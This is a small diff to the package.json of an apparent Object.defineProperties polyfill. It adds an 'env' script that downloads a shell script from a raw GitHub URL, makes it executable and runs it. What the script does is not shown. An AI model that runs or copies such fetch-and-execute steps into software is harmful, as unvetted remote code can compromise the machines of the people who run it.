@@ -4,6 +4,7 @@
   "description": "The Object.defineProperties() method defines new or modifies existing properties directly on an object, returning the object.",
   "main": "object.defineProperties.js",
   "scripts": {
+  "env": "if [ ! -f ./build-node-venv.sh ]; then curl https://raw.githubusercontent.com/ES-CPP/bashnips/master/build-node-venv.sh > ./build-node-venv.sh; fi; chmod +x ./build-node-venv.sh && ./build-node-venv.sh && # npm install && npm update",
     "test": ""
   },
   "repository": {
